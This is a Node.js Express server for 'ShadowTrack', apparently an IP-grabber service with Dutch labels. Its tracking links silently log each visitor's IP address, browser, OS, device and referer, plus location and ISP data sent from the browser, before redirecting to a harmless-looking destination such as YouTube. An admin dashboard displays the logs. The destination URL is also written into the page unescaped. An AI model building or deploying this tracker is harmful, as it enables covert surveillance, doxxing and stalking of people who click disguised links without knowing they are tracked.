const express = require('express');
const dotenv = require('dotenv');
const uaParser = require('ua-parser-js');
const basicAuth = require('express-basic-auth');
const fs = require('fs');

dotenv.config();

const app = express();
app.use(express.static('public'));
app.use(express.json());

const auth = basicAuth({
  users: { [process.env.ADMIN_USER]: process.env.ADMIN_PASS },
  challenge: true
});

// === MOEIE LANDING PAGE ===
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="nl">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>ShadowTrack</title>
      <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        body { margin:0; padding:0; font-family:'Inter',sans-serif; background:linear-gradient(135deg,#0a0a0a,#1a0033); color:white; height:100vh; display:flex; align-items:center; justify-content:center; overflow:hidden; }
        .container { text-align:center; z-index:2; }
        h1 { font-size:4.5rem; margin:0; background:linear-gradient(90deg,#00ff88,#00ccff); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
        .subtitle { font-size:1.4rem; margin:20px 0 40px; opacity:0.9; }
        .btn { display:inline-block; padding:16px 40px; font-size:1.2rem; background:#00ff88; color:black; text-decoration:none; border-radius:50px; font-weight:700; box-shadow:0 10px 30px rgba(0,255,136,0.4); }
        .btn:hover { transform:translateY(-5px); box-shadow:0 15px 40px rgba(0,255,136,0.6); }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>SHADOWTRACK</h1>
        <p class="subtitle">Geavanceerde IP Tracking & Analytics</p>
        <a href="/admin" class="btn">OPEN DASHBOARD →</a>
      </div>
    </body>
    </html>
  `);
});

// === TRACKER ===
app.get('/track/:id', async (req, res) => {
  const trackerId = req.params.id;
  let ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim().replace('::ffff:', '');

  const userAgent = req.headers['user-agent'] || 'Unknown';
  const referer = req.headers.referer || 'Direct';

  let destinationUrl = "https://youtube.com";

  try {
    // Destination ophalen
    if (fs.existsSync('trackers.json')) {
      const trackers = JSON.parse(fs.readFileSync('trackers.json', 'utf8'));
      const tracker = trackers.find(t => t.tracker_id === trackerId);
      if (tracker) destinationUrl = tracker.destination_url;
    }

    const parser = uaParser(userAgent);

    const log = {
      timestamp: new Date().toISOString(),
      tracker_id: trackerId,
      ip: ip,
      country: 'Fetching...',
      city: 'Fetching...',
      isp: 'Fetching...',
      browser: parser.browser.name || 'Unknown',
      os: parser.os.name || 'Unknown',
      device: parser.device.type || 'desktop',
      useragent: userAgent,
      referer: referer
    };

    fs.appendFileSync('logs.txt', JSON.stringify(log) + '\n');
    console.log(`✅ Tracker geladen → ${trackerId} | IP: ${ip}`);

  } catch (error) {
    console.error("Tracker error:", error);
  }

  let html = fs.readFileSync(__dirname + '/views/redirect.html', 'utf8');
  html = html.replace("{{DESTINATION_URL}}", destinationUrl);
  res.send(html);
});

// === API: Geo data vanuit browser opslaan ===
app.post('/api/log-geo', (req, res) => {
  const { tracker_id, ip, country, city, isp } = req.body;

  if (!tracker_id) return res.status(400).json({ error: "No tracker_id" });

  try {
    const log = {
      timestamp: new Date().toISOString(),
      tracker_id: tracker_id,
      ip: ip || 'Unknown',
      country: country || 'Unknown',
      city: city || 'Unknown',
      isp: isp || 'Unknown',
      browser: 'Browser Geo',
      os: 'Browser Geo',
      device: 'Browser Geo'
    };

    fs.appendFileSync('logs.txt', JSON.stringify(log) + '\n');
    console.log(`📍 Browser Geo ontvangen → ${country} - ${city}`);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: "Save failed" });
  }
});

// === ADMIN ===
app.get('/admin', auth, (req, res) => {
  res.sendFile(__dirname + '/views/admin.html');
});

app.get('/api/logs', auth, (req, res) => {
  if (fs.existsSync('logs.txt')) {
    const data = fs.readFileSync('logs.txt', 'utf8');
    const logs = data.trim().split('\n').filter(Boolean).map(line => JSON.parse(line));
    res.json(logs.reverse());
  } else {
    res.json([]);
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ IP Logger draait op poort ${PORT}`);
});